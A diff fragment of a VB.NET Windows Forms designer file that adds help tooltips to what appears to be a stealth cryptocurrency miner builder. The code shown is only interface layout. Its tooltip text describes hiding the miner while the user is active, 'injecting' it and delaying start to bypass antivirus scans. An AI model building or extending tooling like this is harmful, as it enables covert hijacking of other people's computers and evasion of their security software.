+        Me.Label19.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label19.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label19.ForeColor = System.Drawing.Color.Teal
+        Me.Label19.Location = New System.Drawing.Point(530, 165)
+        Me.Label19.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label19.Name = "Label19"
+        Me.Label19.Size = New System.Drawing.Size(18, 20)
+        Me.Label19.TabIndex = 46
+        Me.Label19.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label19, "The parameters to mine with. ONLY CHANGE THESE IF YOU KNOW WHAT YOU ARE DOING.")
+        '
         'chkAdvanced
         '
         Me.chkAdvanced.AccentColor = System.Drawing.Color.ForestGreen
@@ -1156,6 +1126,21 @@ Partial Class Form1
         Me.txtAdvParam.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtAdvParam.UseSystemPasswordChar = False
         Me.txtAdvParam.WordWrap = False
+        '
+        'Label15
+        '
+        Me.Label15.AutoSize = True
+        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label15.ForeColor = System.Drawing.Color.Teal
+        Me.Label15.Location = New System.Drawing.Point(262, 26)
+        Me.Label15.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label15.Name = "Label15"
+        Me.Label15.Size = New System.Drawing.Size(18, 20)
+        Me.Label15.TabIndex = 39
+        Me.Label15.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label15, "If enabled the miner will pause when the computer is active and resume when no ke" &
+        "yboard and mouse input has been detected for the ""Idle Wait"" amount of minutes.")
         '
         'Label11
         '
@@ -1194,6 +1179,21 @@ Partial Class Form1
         Me.TabPage5.Size = New System.Drawing.Size(673, 295)
         Me.TabPage5.TabIndex = 4
         Me.TabPage5.Text = "Build"
+        '
+        'Label28
+        '
+        Me.Label28.AutoSize = True
+        Me.Label28.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label28.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label28.ForeColor = System.Drawing.Color.Teal
+        Me.Label28.Location = New System.Drawing.Point(267, 20)
+        Me.Label28.Margin = New System.Windows.Forms.Padding(4, 0, 4, 0)
+        Me.Label28.Name = "Label28"
+        Me.Label28.Size = New System.Drawing.Size(18, 20)
+        Me.Label28.TabIndex = 58
+        Me.Label28.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
+        "virus scans!")
         '
         'Label29
         '
